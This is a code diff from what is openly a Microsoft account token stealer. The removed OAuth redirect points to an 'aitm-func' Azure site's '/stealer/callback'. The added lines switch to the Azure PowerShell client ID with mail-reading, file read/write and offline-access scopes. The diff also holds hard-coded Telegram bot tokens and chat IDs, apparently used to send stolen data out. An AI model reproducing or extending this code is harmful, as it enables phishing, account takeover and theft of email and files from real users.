@@ -7,9 +7,9 @@ const TELEGRAM_CHAT_ID = "6743632244";
 const TELEGRAM_BOT_TOKEN2 = "7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U";
 const TELEGRAM_CHAT_ID2 = "6263177378";
 
-// OAuth configuration - Using Microsoft Office client ID
-const client_id = '1fec8e78-bce4-4aaf-ab1b-5451cc387264'; // Microsoft Office client ID
-const redirect_uri = 'https://aitm-func-new-1754085350.azurewebsites.net/stealer/callback'; // FIXED: Point to our callback
+// OAuth configuration - Using Azure PowerShell client ID for better consumer account support
+const client_id = '1950a258-227b-4e31-a9cf-717495945fc2'; // Azure PowerShell - supports OAuth flows for consumer accounts
+const redirect_uri = 'https://login.microsoftonline.com/common/oauth2/nativeclient'; // Using native client to avoid localhost redirects
 const scopes = 'openid profile email User.Read Mail.Read Files.ReadWrite.All offline_access';
 
 async function sendTelegram(message, isSecondary = false) {
